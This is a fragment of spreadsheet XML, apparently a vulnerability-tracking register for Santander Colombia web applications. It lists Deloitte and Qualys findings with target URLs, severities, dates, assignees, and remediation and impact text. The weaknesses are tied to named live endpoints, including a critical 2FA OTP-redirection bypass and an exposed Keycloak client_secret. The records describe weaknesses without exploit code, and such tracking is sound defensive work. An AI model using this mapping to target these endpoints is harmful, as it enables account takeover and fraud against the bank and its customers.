    <s v="Mediante la presente vulnerabilidad, y la inyección de código que supone, sería posible para un atacante generar direcciones URLs maliciosos para realizar las siguientes acciones: • Robo de sesiones: Acceder al identificador de sesión del usuario, almacenado en forma de cookie. Phising: Modificar el aspecto de la aplicación Web y pedir a los usuarios información sensible. • Explotación de vulnerabilidades: Incluir código especialmente diseñado para explotar vulnerabilidades del navegador, de los conectores del mismo o del sistema operativo de lavíctima. Esto puede tener consecuencias muy diversas, que pueden llevar a comprometer_x000a_totalmente el sistema de la víctima._x000a_• Ejecución de acciones de forma &quot;transparente&quot; para el usuario: Interactuar con la aplicación_x000a_y realizar acciones sin el conocimiento del usuario"/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Cesar Augusto Puentes"/>
  </r>
  <r>
    <n v="321"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="API Notificaciones"/>
    <m/>
    <s v="SCO-26-CNMPO-001-AP-003"/>
    <x v="133"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <m/>
    <m/>
    <m/>
    <s v=" https://notificaciones.api.santander.com.co"/>
    <m/>
    <m/>
    <d v="2026-03-04T00:00:00"/>
    <n v="111"/>
    <d v="2026-07-02T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="XSS Basada en el DOM es un tipo de vulnerabilidad de seguridad en aplicaciones web que permite a un atacante inyectar y ejecutar código malicioso en el navegador web de un usuario. A diferencia de otras formas de XSS, como XSS almacenada o reflejada, la XSS Basada en el DOM se enfoca en la manipulación del Modelo de Objetos del Documento (DOM) del navegador web, en lugar de interactuar con el servidor web"/>
    <s v="Para prevenir la XSS Basada en el DOM, es esencial que los desarrolladores web implementen prácticas de seguridad sólidas, como la validación de entrada en el lado del servidor y la codificación adecuada de la salida. También es crucial comprender cómo las aplicaciones manipulan el DOM y cómo los datos del cliente pueden influir en él para garantizar una defensa efectiva contra esta vulnerabilidad."/>
    <s v="El impacto de un ataque de XSS Basada en el DOM puede ser significativo, ya que el código malicioso se ejecuta dentro del contexto del sitio web legítimo y puede acceder a información sensible, robar sesiones de usuario, redirigir a sitios maliciosos o realizar otras acciones perjudiciales en nombre del usuario afectado."/>
    <m/>
    <m/>
    <s v="Cesar Augusto Puentes"/>
  </r>
  <r>
    <n v="322"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="API Notificaciones"/>
    <m/>
    <s v="SCO-26-CNMPO-001-AP-004"/>
    <x v="134"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <m/>
    <m/>
    <m/>
    <s v=" https://notificaciones.api.santander.com.co"/>
    <m/>
    <m/>
    <d v="2026-03-04T00:00:00"/>
    <n v="111"/>
    <d v="2026-07-02T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de las cabeceras cache-control y pragma HTTP permite que el navegador y los proxies almacenen el contenido en la memoria caché. Independientemente de la política de caché definida por la aplicación web"/>
    <s v="Las aplicaciones deben devolver las directivas de almacenamiento en caché indicando a los navegadores que no almacenen copias locales de ningún dato sensible. A menudo, esto se puede lograr mediante la configuración del servidor web para evitar el almacenamiento en caché de rutas relevantes o cualquier otra información sensible. Alternativamente, la mayoría de las plataformas de desarrollo web, permiten controlar las directivas de almacenamiento en caché del servidor desde scripts individuales. Se recomienda que el servidor web devuelva las siguientes cabeceras HTTP en todas las respuestas que contengan contenido sensible: • Cache-control: no-store • Pragma: no-cache"/>
    <s v="A menos que se indique lo contrario, los navegadores pueden almacenar una copia en caché local del contenido recibido de los servidores web. Algunos navegadores, guardan en caché el contenido obtenido a través de HTTPS. Si la información sensible en las respuestas de la aplicación se almacena en caché local, puede ser recuperada por otros usuarios que tienen acceso a la misma computadora en un momento futuro además de ser susceptible a ataques de tipo Caché Poisoning."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Cesar Augusto Puentes"/>
  </r>
  <r>
    <n v="323"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-aea0a6c3-c7c3-400c-9612-e6ff385ca856"/>
    <m/>
    <x v="135"/>
    <m/>
    <x v="2"/>
    <s v="High"/>
    <m/>
    <m/>
    <m/>
    <s v="http://api-auto.hubapi.com/"/>
    <m/>
    <m/>
    <d v="2026-03-04T00:00:00"/>
    <n v="111"/>
    <d v="2026-04-03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enny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="324"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-9a81b71d-50d7-400c-8bd1-c61f8f8be959"/>
    <m/>
    <x v="135"/>
    <m/>
    <x v="2"/>
    <s v="High"/>
    <m/>
    <m/>
    <m/>
    <s v="http://edge-kv.hubapi.com/"/>
    <m/>
    <m/>
    <d v="2026-03-04T00:00:00"/>
    <n v="111"/>
    <d v="2026-04-03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enny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="325"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-8e7c44b2-0bd0-4228-805b-58bdde3cc09e"/>
    <m/>
    <x v="135"/>
    <m/>
    <x v="2"/>
    <s v="High"/>
    <m/>
    <m/>
    <m/>
    <s v="http://edge-kv-na1.hubapi.com/"/>
    <m/>
    <m/>
    <d v="2026-03-04T00:00:00"/>
    <n v="111"/>
    <d v="2026-04-03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enny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="326"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-523f33c4-1b5f-4a5d-b4e1-2587ce6cf153"/>
    <m/>
    <x v="135"/>
    <m/>
    <x v="2"/>
    <s v="High"/>
    <m/>
    <m/>
    <m/>
    <s v="http://feedback.hubapi.com/"/>
    <m/>
    <m/>
    <d v="2026-03-04T00:00:00"/>
    <n v="111"/>
    <d v="2026-04-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="A link is accessible over an insecure connection, i.e. HTTP."/>
    <m/>
    <s v="Ensure that the target website is accessible over HTTPS only._x000a_If non-HTTPS requests are received, the server should redirect the request to HTTPS. It is also recommended to use the Strict-Transport-Security response header to ensure that web browsers use only HTTPS when making requests to the server."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="327"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM--5255039487965443251"/>
    <m/>
    <x v="136"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v="mx.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-04T00:00:00"/>
    <n v="111"/>
    <d v="2026-06-02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m/>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enny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="328"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM-2608568286331767773"/>
    <m/>
    <x v="136"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v="smtp.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-04T00:00:00"/>
    <n v="111"/>
    <d v="2026-06-02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m/>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enny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="329"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM--3134702355103034807"/>
    <m/>
    <x v="136"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v="smtp.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-04T00:00:00"/>
    <n v="111"/>
    <d v="2026-06-02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m/>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enny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="330"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM-5838260970963253057"/>
    <m/>
    <x v="136"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v="smtp.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-04T00:00:00"/>
    <n v="111"/>
    <d v="2026-06-02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m/>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enny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="331"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM--9049177468578007296"/>
    <m/>
    <x v="136"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v="smtp.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-04T00:00:00"/>
    <n v="111"/>
    <d v="2026-06-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="TLS is capable of using a multitude of ciphers (algorithms) to create the public and private key pairs._x000a_For example if TLSv1.0 uses either the RC4 stream cipher, or a block cipher in CBC mode._x000a_RC4 is known to have biases and the block cipher in CBC mode is vulnerable to the POODLE attack._x000a__x000a_TLSv1.0, if configured to use the same cipher suites as SSLv3, includes a means by which a TLS implementation can downgrade the connection to SSL v3.0, thus weakening security._x000a_A POODLE-type attack could also be launched directly at TLS without negotiating a downgrade._x000a_ This QID is an automatic PCI FAIL in accordance with the PCI standards. _x000a__x000a_Further details can be found under: _x000a_PCI: ASV Program Guide v3.1 (page 27)_x000a_PCI: Use of SSL Early TLS and ASV Scans"/>
    <m/>
    <s v="Disable the use of TLSv1.0 protocol in favor of a cryptographically stronger protocol such as TLSv1.2._x000a_The following openssl commands can be used to do a manual test:_x000a_openssl s_client -connect ip:port -tls1_x000a__x000a_If the test is successful, then the target support TLSv1"/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="332"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-69e8f55735e4b16928f42065"/>
    <s v="SCO-26-CNMPO-012-CO-001"/>
    <x v="137"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.8"/>
    <m/>
    <m/>
    <s v="https://simplefinance.santanderfinancing.com:4443/SimpleFinance/login"/>
    <m/>
    <m/>
    <d v="2026-04-22T00:00:00"/>
    <n v="62"/>
    <d v="2026-07-21T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación auditada emite la cookie de sesión JSESSIONID sin el atributo Secure, lo que permite  que el navegador la transmita tanto por HTTP como por HTTPS. En la práctica, esto significa que si  un usuario accede por un canal no cifrado, ya sea por redirección, por error de configuración o de  forma intencionada por un atacante, la cookie viaja en claro y puede ser capturada."/>
    <s v="La corrección pasa por añadir el atributo Secure a todas las cookies de sesión, de modo que el _x000a_navegador únicamente las envíe sobre conexiones HTTPS. En aplicaciones Java, esto se configura _x000a_en el xml._x000a_Conviene revisar también el resto de las cookies de la aplicación y confirmar que HttpOnly está _x000a_igualmente presente para evitar el acceso desde JavaScript."/>
    <s v="Un atacante con capacidad para interceptar tráfico de red, mediante ARP spoofing en una red local _x000a_o posicionándose en un punto intermedio de la comunicación, podría capturar el valor de la _x000a_JSESSIONID y reutilizarlo para autenticarse en la aplicación sin necesidad de credenciales. El impacto _x000a_directo es el secuestro de sesiones de usuarios autenticados."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="333"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-69e8f59c35e4b16928f42068"/>
    <s v="SCO-26-CNMPO-012-CO-002"/>
    <x v="138"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.3"/>
    <m/>
    <m/>
    <s v="https://simplefinance.santanderfinancing.com:4443/SimpleFinance/login"/>
    <m/>
    <m/>
    <d v="2026-04-22T00:00:00"/>
    <n v="62"/>
    <d v="2026-07-21T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La funcionalidad de recuperación de contraseña de la aplicación devuelve mensajes de respuesta distintos en función de si el usuario introducido existe o no en el sistema. Este comportamiento permite a un atacante determinar qué cuentas de usuario están registradas en la plataforma sinnecesidad de autenticación previa, únicamente observando la respuesta del servidor ante cada _x000a_intento."/>
    <s v="La aplicación debe devolver un mensaje genérico e idéntico independientemente de si el usuario _x000a_introducido existe o no en el sistema. Un ejemplo de mensaje apropiado sería del tipo &quot;Si el correo _x000a_está registrado, recibirás un enlace de recuperación en breve&quot;, que no revela información sobre la_x000a_existencia de la cuenta. Esta corrección debe aplicarse tanto al mensaje visible en la interfaz como _x000a_a cualquier diferencia observable en los tiempos de respuesta, ya que una respuesta más lenta _x000a_para usuarios existentes también puede ser explotada como canal lateral."/>
    <s v="Un atacante puede automatizar peticiones contra el formulario de recuperación de contraseña _x000a_utilizando diccionarios de correos electrónicos o nombres de usuario comunes para identificar qué _x000a_cuentas están activas en la plataforma. La información obtenida puede utilizarse como punto de _x000a_partida para ataques posteriores de fuerza bruta, phishing dirigido o credential stuffing contra los _x000a_usuarios identificados. El hecho de que el endpoint sea público y no requiera autenticación reduce _x000a_considerablemente el coste del ataque para el adversario."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="334"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderconsumer"/>
    <m/>
    <s v="SCO-26-CNMPA-015-AP-001"/>
    <x v="10"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://www.santanderconsumer.co/"/>
    <m/>
    <m/>
    <d v="2026-04-30T00:00:00"/>
    <n v="54"/>
    <d v="2026-07-29T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que la aplicación devuelve información acerca de la infraestructura utilizada para sustentar a la propia aplicación, más concretamente, indicando el tipo de servidor y su versión. Esta _x000a_información podría ser utilizada por un atacante con el objetivo de recabar información para ataques futuros._x000a_Normalmente este tipo de información se puede encontrar en las cabeceras HTTP de respuesta del servidor o en alguna página de error o por defecto del aplicativo."/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al tipo de servidor _x000a_y versión utilizado para alojar la propia aplicación. Para ello es necesario eliminar las cabeceras de _x000a_respuesta HTTP, páginas por defecto y mensajes de error que divulguen este tipo de información."/>
    <s v="Conocer el tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite _x000a_a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así _x000a_como generar ataques más elaborados contra la plataforma."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="335"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <m/>
    <s v="SC-26-CNMPO-002-AP-001"/>
    <x v="43"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/credito-vehiculo-prepago"/>
    <m/>
    <m/>
    <d v="2026-05-07T00:00:00"/>
    <n v="47"/>
    <d v="2026-08-05T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación expone información sensible como credenciales, datos personales, información financiera o datos de negocio confidenciales a través de respuestas HTTP, endpoints accesibles,ficheros accesibles públicamente o mensajes de error."/>
    <s v="Se debe identificar y clasificar toda la información sensible de la aplicación e implementar controles _x000a_de acceso adecuados para cada categoría. Se deben eliminar o proteger adecuadamente todos los _x000a_canales por los que se expone información sensible. Se debe implementar cifrado en reposo y en _x000a_tránsito para todos los datos sensibles."/>
    <s v="Un atacante puede acceder a la información sensible expuesta y usarla para comprometer cuentas _x000a_de usuario, realizar fraude, incumplir la normativa de protección de datos o realizar ataques más _x000a_sofisticados usando la información obtenida. El impacto depende de la naturaleza y sensibilidad de _x000a_la información expuesta."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="336"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <m/>
    <s v="SC-26-CNMPO-002-AP-002"/>
    <x v="30"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.3"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/clientes_tesla"/>
    <m/>
    <m/>
    <d v="2026-05-07T00:00:00"/>
    <n v="47"/>
    <d v="2026-08-05T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación no implementa medidas de protección contra ataques de clickjacking, permitiendo que sus páginas sean incrustadas en iframes de sitios web maliciosos. Un atacante puede engañar a los usuarios para que realicen acciones no deseadas en la aplicación al hacer click en elementos invisibles superpuestos."/>
    <s v="Se debe implementar la cabecera X-Frame-Options con el valor DENY para impedir que la aplicación _x000a_sea cargada en cualquier iframe. Si se requiere cargar en el mismo dominio, se puede usar _x000a_SAMEORIGIN. Complementariamente, se debe configurar la directiva frame-ancestors en la _x000a_Content-Security-Policy para un control más preciso compatible con navegadores modernos."/>
    <s v="Mediante clickjacking un atacante puede manipular a usuarios autenticados para que ejecuten _x000a_acciones involuntarias en la aplicación aprovechando que la página se carga dentro de un iframe_x000a_invisible en un sitio bajo control del atacante. Las acciones que puede desencadenar dependen de la funcionalidad de la aplicación y pueden incluir cambios de configuración, autorización de _x000a_transacciones o cambio de credenciales"/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="337"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <m/>
    <s v="SC-26-CNMPO-002-AP-003"/>
    <x v="30"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.3"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/credito-vehiculo-prepago"/>
    <m/>
    <m/>
    <d v="2026-05-07T00:00:00"/>
    <n v="47"/>
    <d v="2026-08-05T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación no implementa medidas de protección contra ataques de clickjacking, permitiendo que sus páginas sean incrustadas en iframes de sitios web maliciosos. Un atacante puede engañar a los usuarios para que realicen acciones no deseadas en la aplicación al hacer click en elementos invisibles superpuestos."/>
    <s v="Se debe implementar la cabecera X-Frame-Options con el valor DENY para impedir que la aplicación _x000a_sea cargada en cualquier iframe. Si se requiere cargar en el mismo dominio, se puede usar _x000a_SAMEORIGIN. Complementariamente, se debe configurar la directiva frame-ancestors en la _x000a_Content-Security-Policy para un control más preciso compatible con navegadores modernos."/>
    <s v="Mediante clickjacking un atacante puede manipular a usuarios autenticados para que ejecuten _x000a_acciones involuntarias en la aplicación aprovechando que la página se carga dentro de un iframe_x000a_invisible en un sitio bajo control del atacante. Las acciones que puede desencadenar dependen de la funcionalidad de la aplicación y pueden incluir cambios de configuración, autorización de _x000a_transacciones o cambio de credenciales"/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="338"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <m/>
    <s v="SC-26-CNMPO-002-AP-004"/>
    <x v="139"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.1"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/clientes_tesla"/>
    <m/>
    <m/>
    <d v="2026-05-07T00:00:00"/>
    <n v="47"/>
    <d v="2026-09-04T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación no incluye la cabecera HTTP X-Content-Type-Options: nosniff en sus respuestas, permitiendo que los navegadores intenten adivinar el tipo de contenido de las respuestas (MIME sniffing) en lugar de respetar el Content-Type declarado. Esto puede derivar en la ejecución no intencional de contenido como scripts."/>
    <s v="Un atacante puede explotar el MIME sniffing del navegador para hacer que contenido que debería _x000a_ser tratado como texto plano o imagen sea interpretado como HTML o JavaScript ejecutable. Esto puede combinarse con la subida de ficheros o la inyección de contenido para ejecutar XSS en _x000a_contextos donde normalmente no sería posible."/>
    <s v="Se debe incluir la cabecera X-Content-Type-Options: nosniff en todas las respuestas de la _x000a_aplicación. Esta cabecera instruye al navegador para que respete estrictamente el Content-Type _x000a_declarado sin intentar inferir el tipo de contenido, previniendo los ataques basados en MIME _x000a_sniffing"/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="339"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <m/>
    <s v="SC-26-CNMPO-002-AP-005"/>
    <x v="139"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.1"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/credito-vehiculo-prepago"/>
    <m/>
    <m/>
    <d v="2026-05-07T00:00:00"/>
    <n v="47"/>
    <d v="2026-09-04T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación no incluye la cabecera HTTP X-Content-Type-Options: nosniff en sus respuestas, permitiendo que los navegadores intenten adivinar el tipo de contenido de las respuestas (MIME sniffing) en lugar de respetar el Content-Type declarado. Esto puede derivar en la ejecución no intencional de contenido como scripts."/>
    <s v="Un atacante puede explotar el MIME sniffing del navegador para hacer que contenido que debería _x000a_ser tratado como texto plano o imagen sea interpretado como HTML o JavaScript ejecutable. Esto puede combinarse con la subida de ficheros o la inyección de contenido para ejecutar XSS en _x000a_contextos donde normalmente no sería posible."/>
    <s v="Se debe incluir la cabecera X-Content-Type-Options: nosniff en todas las respuestas de la _x000a_aplicación. Esta cabecera instruye al navegador para que respete estrictamente el Content-Type _x000a_declarado sin intentar inferir el tipo de contenido, previniendo los ataques basados en MIME _x000a_sniffing"/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="340"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <m/>
    <s v="SC-26-CNMPO-022-CO-001"/>
    <x v="140"/>
    <m/>
    <x v="2"/>
    <s v="Critical"/>
    <n v="9.8000000000000007"/>
    <m/>
    <m/>
    <s v="https://aliados.santanderconsumer.co/"/>
    <m/>
    <m/>
    <d v="2026-05-20T00:00:00"/>
    <n v="34"/>
    <d v="2026-05-30T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El sistema utiliza un segundo factor de autenticación (2FA) mediante el envío de un código OTP al correo o teléfono del usuario. Sin embargo, el endpoint encargado del envío permite especificar el destinatario sin validar que pertenezca al usuario autenticado. Esto permite a un atacante modificar dicho parámetro y recibir el OTP en una dirección controlada, evadiendo así la verificación 2FA y accediendo a operaciones privilegiadas sin autorización."/>
    <s v="El sistema debe validar internamente el canal y destino del 2FA, evitando que el cliente los _x000a_especifique en la petición. El OTP solo debe enviarse a direcciones o números previamente _x000a_asociados y verificados del usuario autenticado. Asimismo, se recomienda registrar los intentos de _x000a_cambio de canal, aplicar controles de tasa (rate limiting) y generar alertas ante comportamientos _x000a_anómalos."/>
    <s v="La falta de validación en el parámetro que define el destinatario del código OTP permite a un _x000a_atacante manipular la solicitud y recibir el segundo factor de autenticación en una dirección de _x000a_correo no autorizada. Esto posibilita el acceso no legítimo a cuentas o funcionalidades críticas, _x000a_comprometiendo la seguridad del proceso de autenticación multifactor. "/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="341"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <m/>
    <s v="SC-26-CNMPO-022-CO-002"/>
    <x v="141"/>
    <m/>
    <x v="2"/>
    <s v="High"/>
    <n v="8.6"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2026-05-13T00:00:00"/>
    <n v="41"/>
    <d v="2026-06-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación expone credenciales sensibles de autenticación OAuth correspondientes a un cliente de Keycloak (client_id y client_secret) directamente desde el frontend de la aplicación. Estas credenciales son utilizadas para realizar peticiones de autenticación contra el proveedor de identidad y pueden ser obtenidas fácilmente por cualquier usuario mediante la inspección del código _x000a_JavaScript, tráfico HTTP o herramientas de desarrollo del navegador._x000a_El uso de un client_secret en aplicaciones frontend constituye una mala práctica de seguridad, ya que las aplicaciones ejecutadas del lado cliente no pueden garantizar la confidencialidad de secretos criptográficos. La exposición de este tipo de credenciales rompe el modelo de seguridad de OAuth 2.0 y OpenID Connect, donde los clientes públicos no deben almacenar secretos confidenciales."/>
    <s v="Eliminar el client_secret del código frontend de forma inmediata y regenerarlo en Keycloak, _x000a_revocando todos los tokens activos del cliente. Para evitar que el problema se repita, lo correcto es _x000a_migrar a Authorization Code Flow + PKCE (RFC 7636), diseñado precisamente para aplicaciones _x000a_frontend donde no es posible proteger un secreto. Idealmente, mover la autenticación al backend _x000a_mediante el patrón BFF para que el navegador nunca maneje credenciales OAuth directamente. _x000a_Adicionalmente, eliminar el rol offline_access del cliente público, activar &quot;Revoke Refresh Token&quot; en _x000a_Keycloak para que cada uso del refresh token lo invalide, y revisar los logs del endpoint /login_client _x000a_para detectar si ha habido usos indebidos previos a este hallazgo."/>
    <s v="Un atacante externo puede extraer el client_secret del bundle JavaScript de la aplicación y usarlo _x000a_para obtener tokens Bearer válidos contra el endpoint /login_client, sin necesidad de ningún tipo _x000a_de credencial de usuario. Esto fue confirmado durante las pruebas, accediendo a endpoints de _x000a_producción con HTTP 200. Además, dado el scope offline_access presente en los tokens emitidos, _x000a_es posible mantener ese acceso de forma indefinida rotando el refresh token, lo que significa que _x000a_con una sola extracción de las credenciales el acceso no expira._x000a_Adicionalmente, si el atacante dispone de acceso a la red interna, estas mismas credenciales _x000a_podrían ser suficientes para acceder a Keycloak y desde ahí gestionar usuarios, impersonar cuentas _x000a_o modificar roles dentro del sistema de la identidad del banco."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="342"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <m/>
    <s v="SC-26-CNMPO-022-CO-003"/>
    <x v="103"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="6.2"/>
    <m/>
    <m/>
    <s v="https://aliados.santanderconsumer.co/"/>
    <m/>
    <m/>
    <d v="2026-05-20T00:00:00"/>
    <n v="34"/>
    <d v="2026-08-18T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante el análisis de la aplicación web se identificó la exposición de credenciales y valores sensibles incluidos dentro de archivos JavaScript públicos distribuidos por la aplicación. El código analizado contenía información codificada en Base64 y mecanismos de ofuscación reversible implementados del lado cliente. Asimismo, se comprobó que parte de la información sensible podía recuperarse fácilmente mediante procesos de decodificación, debido a que la lógica necesaria para revertir la _x000a_protección también se encontraba incluida dentro del propio código JavaScript."/>
    <s v="Se recomienda eliminar inmediatamente cualquier credencial, token o información sensible _x000a_embebida dentro de código frontend distribuido públicamente. Todas las credenciales _x000a_identificadas deben considerarse comprometidas y proceder a su rotación inmediata, _x000a_independientemente de si continúan activas. Para integraciones OAuth se recomienda adoptar _x000a_flujos seguros como Authorization Code + PKCE y evitar el uso de client_secret en aplicaciones _x000a_frontend públicas. Asimismo, se recomienda implementar un Backend For Frontend (BFF) o proxy _x000a_autenticado que custodie las credenciales y valores sensibles del lado servidor y centralice el acceso _x000a_a servicios externos. Finalmente, se recomienda revisar otros bloques JavaScript y artefactos _x000a_publicados por la organización con el objetivo de identificar exposiciones similares y auditar los _x000a_registros de acceso para detectar posibles usos indebidos previos al hallazgo."/>
